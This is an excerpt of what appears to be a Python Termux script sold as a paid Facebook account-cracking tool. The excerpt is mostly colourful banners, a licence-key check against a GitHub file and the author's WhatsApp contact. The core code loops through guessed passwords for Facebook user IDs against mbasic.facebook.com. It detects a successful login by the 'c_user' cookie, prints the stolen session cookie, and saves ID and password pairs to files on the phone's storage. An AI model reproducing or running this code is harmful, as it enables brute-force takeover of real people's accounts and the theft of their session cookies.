...
def menu_apikey():
  ...
  id = "→".join(uuid)
  server = requests.get('https://github.com/MAHMUD-RAIHAN-404/New-Project-2023-/blob/main/Approvle.txt').text
...
\033[1;33m╔═══════════════════════════════════════════════╗
║\033[1;32m🌺WELLCOME TO 𝐑𝐀𝐈𝐇𝐀𝐍  COMMAND WORLD 2.0🌺\033[1;33m║
╚═══════════════════════════════════════════════╝                                             
\033[32;1m╔═══════════════════════════════════════════════╗
\033[32;1m║ ╔═══════════════════════════════════════════╗ ║
...
\033[32;1m╚═══════════════════════════════════════════════╝""")
  play_music('12.mp3')   
  print(f"\t \033[1;32m  ADMIN BY 𝐑𝐀𝐈𝐇𝐀𝐍 \033[1;37m ")
  print(f"")
  print(f"\t \033[1;32m  Best Paid Tools Of Mahmud Raihan   \033[1;37m ")
  print(f"")
  print(f"\t \033[1;32m  Whatsapps Number +8801618921827\033[1;37m ")
  print(f"")
...
\033[1;33m╔═══════════════════════════════════════════════╗
║\033[1;32m🌺 WELLCOME TO 𝐑𝐀𝐈𝐇𝐀𝐍 TERMUX COMMAND WORLD 2.0 🌺\033[1;33m║
╚═══════════════════════════════════════════════╝                                             
\033[32;1m╔═══════════════════════════════════════════════╗
\033[32;1m║ ╔═══════════════════════════════════════════╗ ║
\033[32;1m║ ║\033[91;1m❤︎[❥] 𝐓𝐎𝐎𝐋S    : \033[31;1m\033[36;1m BD RANDOM                 \033[32;1m║ ║
\033[32;1m║ ╠═══════════════════════════════════════════╣ ║
\033[32;1m║ ║\033[32;1m❤︎[❥] 𝐀𝐔𝐓𝐇𝐎𝐑   : \033[32;1m\033[34;1m Raihan                      \033[32;1m║ ║
\033[32;1m║ ╠═══════════════════════════════════════════╣ ║
\033[32;1m║ ║\033[34;1m❤︎[❥] G𝐈𝐓𝐇𝐔𝐁   : \033[33;1m\033[33;1m MAHMUD-RAIHAN-404   \033[34;1m         \033[32;1m║ ║
\033[32;1m║ ╠═══════════════════════════════════════════╣ ║
\033[32;1m║ ║\033[33;1m❤︎[❥] W𝐇𝐀𝐓S𝐀PP : \033[32;1m\033[37;1m 01618921827               \033[32;1m║ ║
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[65:80]
                print(f'\r\33[1;92m [𝐑𝐀𝐈𝐇𝐀𝐍-OK] '+cid+' | '+ps+'\33[0;92m')
                print(f'\r\033[1;92m [☺️] COOKIE : '+coki)
                open('/sdcard/𝐑𝐀𝐈𝐇𝐀𝐍-OK.txt', 'a').write(cid+' | '+ps+'\n')
                oks.append(uid)
                break
                ...
                open('/sdcard/𝐑𝐀𝐈𝐇𝐀𝐍-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                oks.append(cid)
                open('/sdcard/𝐑𝐀𝐈𝐇𝐀𝐍-OK.txt', 'a').write(cid+' | '+ps+' | '+uid+'\n')
                break
            else:
                continue
        loop+=1        
...
def c(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            session = requests.Session()
            sys.stdout.write(f'\r \033[1;90m[\033[1;93mRaihan\033[1;90m] \033[1;96m%s/%s\033[1;90m \033[1;90m[\033[1;92mOK:%s\033[1;90m] '%(loop,tl,len(oks))),
            sys.stdout.flush()
            pro = random.choice(ugen)
            #oo=random.choice(sss)
            free_fb = session.get('https://mbasic.facebook.com').text
